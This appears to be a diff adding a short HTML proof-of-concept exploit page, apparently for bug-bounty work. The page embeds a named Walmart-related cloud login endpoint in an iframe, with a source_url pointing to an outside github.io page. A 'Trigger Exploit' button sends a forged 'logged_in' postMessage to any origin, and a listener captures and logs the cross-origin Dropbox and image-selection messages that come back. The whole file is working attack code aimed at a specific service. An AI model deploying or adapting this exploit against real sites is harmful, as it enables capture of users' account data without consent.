@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>PoC</title>
+</head>
+<body>
+
+    <iframe id="target-frame" src="https://cloudloader.default.prod.walmart.dice.livelinklabs.com/login?service=dropbox&source_url=https://52-hrtz.github.io/front-poc/wal2.html&live_update=true" width="100%" height="400"></iframe>
+    <br>
+    <button onclick="triggerExploit()">Trigger Exploit</button>
+    
+    <h3>Dropbox Logs:</h3>
+   
+    <pre id="logs" style="background: #eee; padding: 10px; max-height: 300px; overflow-y: auto; white-space: pre-wrap; word-break: break-all;"></pre>
+
+    <script>
+        function triggerExploit() {
+            var iframe = document.getElementById('target-frame');
+            iframe.contentWindow.postMessage("logged_in:https://photos.walmart.com/callback_success", '*'); 
+        }
+
+        window.addEventListener("message", function(event) {
+            if (!event.data) return;
+
+            var rawData = typeof event.data === 'object' ? JSON.stringify(event.data) : event.data.toString();
+
+            // Filter only Dropbox related messages
+            if (rawData.includes("image_selected") || rawData.includes("dropbox")) {
+                document.getElementById('logs').innerText += `\nOrigin: ${event.origin}\nData: ${rawData}\n-----------------\n`;
+            }
+        }, false);
+    </script>
+
+</body>
+</html>
